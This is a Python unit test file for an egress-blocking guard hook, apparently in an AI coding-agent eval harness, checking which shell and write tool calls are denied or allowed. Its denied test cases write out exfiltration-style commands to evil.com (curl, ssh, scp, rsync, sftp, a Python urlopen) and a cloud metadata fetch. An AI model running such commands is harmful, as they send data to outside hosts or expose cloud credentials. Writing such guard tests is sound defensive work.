import json
import subprocess
import sys
import unittest
from pathlib import Path

GUARD = Path(__file__).resolve().parents[2] / "evals" / "harnesses" / "claude-code" / "discovery_guard.py"


def run_guard(event: dict) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, str(GUARD)],
        input=json.dumps(event),
        capture_output=True,
        text=True,
    )


class DiscoveryGuardEgress(unittest.TestCase):
    def test_denies_python_interpreter_egress(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {
                "command": "python3 -c \"import urllib.request; "
                            "urllib.request.urlopen('http://evil.com')\""
            },
        }
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_bare_ip_cloud_metadata(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "curl http://169.254.169.254/latest/meta-data/"},
        }
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_allows_benign_local_read(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "cat README.md"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_local_curl(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "curl http://localhost:8080"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_denies_write_tool(self):
        event = {"tool_name": "Write", "tool_input": {"file_path": "foo.txt", "content": "x"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_allows_python_manage_py(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "python3 manage.py check"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_node_filename_arg(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "node index.js"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_pip_install_requirements(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "pip install -r requirements.txt"},
        }
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_python_setup_py_version(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "python3 setup.py --version"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_denies_curl_bare_hostname_no_scheme(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "curl example.com"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_curl_ftp_url(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "curl ftp://evil.com/x"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_ssh_user_at_host(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "ssh user@evil.com"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_scp_user_at_host(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "scp f user@evil.com:/x"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_rsync_user_at_host(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "rsync -a x user@evil.com:/y"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_sftp_user_at_host(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "sftp user@evil.com"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_denies_interpreter_user_at_host(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "python3 exfil.py user@evil.com"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 2, result.stderr)

    def test_allows_ssh_user_at_localhost(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "ssh user@localhost"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_scp_user_at_loopback_ip(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "scp f user@127.0.0.1:/x"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_python_manage_py_check(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "python3 manage.py check"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_node_index_js(self):
        event = {"tool_name": "Bash", "tool_input": {"command": "node index.js"}}
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_allows_pip_install_requirements_file(self):
        event = {
            "tool_name": "Bash",
            "tool_input": {"command": "pip install -r requirements.txt"},
        }
        result = run_guard(event)
        self.assertEqual(result.returncode, 0, result.stderr)


if __name__ == "__main__":
    unittest.main()
